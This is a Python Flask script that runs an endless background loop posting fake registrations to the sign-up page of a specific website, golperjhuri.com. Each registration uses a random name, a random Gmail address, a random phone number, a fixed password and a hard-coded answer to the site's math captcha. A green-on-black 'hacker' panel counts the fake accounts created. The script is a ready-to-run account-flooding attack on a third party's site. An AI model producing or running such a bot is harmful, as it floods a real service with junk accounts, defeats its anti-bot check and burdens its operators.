from flask import Flask, render_template_string
import random
import string
import requests
import threading

# Initialize Flask app
app = Flask(__name__)

# Store logs and count
logs = []
account_count = 0

# Function to generate a random name
def random_name():
    first_names = ['GAJAR','GAJAR','GAJAR']
    last_names = ['BOTOL','BOTOL','BOTOL']
    return f"{random.choice(first_names)} {random.choice(last_names)}"

# Function to generate a random Gmail address
def random_gmail():
    username_length = random.randint(5, 10)
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=username_length))
    return f"{username}@gmail.com"

# Function to generate a random phone number with the prefix 017
def random_phone_number():
    remaining_digits = ''.join(random.choices(string.digits, k=8))
    return f"017{remaining_digits}"

# Define the data posting function
def post_data():
    global account_count
    url = "https://golperjhuri.com/register.php"

    while True:
        # Generate random data
        random_name_value = random_name()
        random_email = random_gmail()
        random_phone = random_phone_number()

        # Define data to be posted
        data = {
            "indecator": "1",
            "user_name": random_name_value,
            "user_email": random_email,
            "user_phon": random_phone,
            "user_adress": "Madhupur",
            "user_school": "Dhaka",
            "user_education": "10",
            "user_pass": "@@@@11Aa",
            "user_pass_check": "@@@@11Aa",
            "user_location": "ঢাকা",
            "gender": "1",
            "numone": "9",
            "numtwo": "0",
            "result": "9",
            "confarm_registration": "নিবন্ধন করুন",
        }

        # Make the POST request
        response = requests.post(url, data=data)

        # Log the response
        if response.status_code == 200:
            account_count += 1
            log_entry = f"Success: {random_name_value}, {random_email}, {random_phone}"
            logs.append(log_entry)
        else:
            log_entry = f"Failed with status code: {response.status_code}"
            logs.append(log_entry)

# Start data posting in a separate thread
threading.Thread(target=post_data, daemon=True).start()

# HTML template with a hacker theme
html_template = """
<!DOCTYPE html>
<html>
<head>
    <title>Account Creation Log</title>
    <style>
        body {
            background-color: #101010;
            color: #00ff00;
            font-family: 'Courier New', Courier, monospace;
        }
        .container {
            width: 80%;
            margin: 0 auto;
            padding: 20px;
        }
        .log-entry {
            margin-bottom: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Account Creation Log</h1>
        <p>Total Accounts Created: {{ account_count }}</p>
        <div>
            {% for log in logs %}
                <div class="log-entry">{{ log }}</div>
            {% endfor %}
        </div>
    </div>
</body>
</html>
"""

# Define the route for the web panel
@app.route('/')
def index():
    return render_template_string(html_template, account_count=account_count, logs=logs)

# Run the Flask app
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
